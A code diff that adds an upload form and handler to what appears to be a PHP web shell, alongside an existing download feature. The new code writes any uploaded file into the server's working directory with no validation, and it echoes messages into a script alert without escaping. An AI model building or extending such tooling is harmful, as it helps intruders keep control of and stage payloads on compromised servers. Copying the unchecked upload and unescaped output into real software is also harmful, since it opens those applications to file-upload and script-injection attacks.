@@ -31,6 +31,36 @@ if ($use_auth)
 	}
 }
 
+function show_alert($msg)
+{
+	echo( sprintf("<script>alert('%s');</script>", $msg) );
+}
+
+if (isset($_FILES["upload"]))
+{
+	$file = $_FILES["upload"];
+
+	$target_directory = getcwd();
+	$target_file = $target_directory . "/" . basename($_FILES["upload"]["name"]);
+	$result_u = null;
+
+	if (file_exists($target_file))
+	{
+		$result_u = "[-] error: file name already exists"; 
+	}
+	else
+	{
+		if (move_uploaded_file($_FILES["upload"]["tmp_name"], $target_file))
+		{
+			$result_u = "[+] success: ok";
+		}
+		else
+		{
+			$result_u = "[-] error: failed to upload file";
+		}
+	}
+}
+
 if (isset($_POST["download"]))
 {
 	$file = $_POST["download"];
@@ -187,6 +217,15 @@ echo( sprintf("
 	)
 );
 ?>
+
+<form action="<? echo($shell); ?>" method="POST" enctype="multipart/form-data">
+	<label for="upload">File:</label>
+	<input type="file" id="upload" name="upload">
+	<input type="submit" value="Upload">
+	<b>Info:</b> file will be uploaded to current working directory.
+</form>
+
+<?php if (isset($result_u)) { show_alert($result_u); } ?>
 
 <form action="<? echo($shell); ?>" method="POST">
 	<label for="download">File:</label>
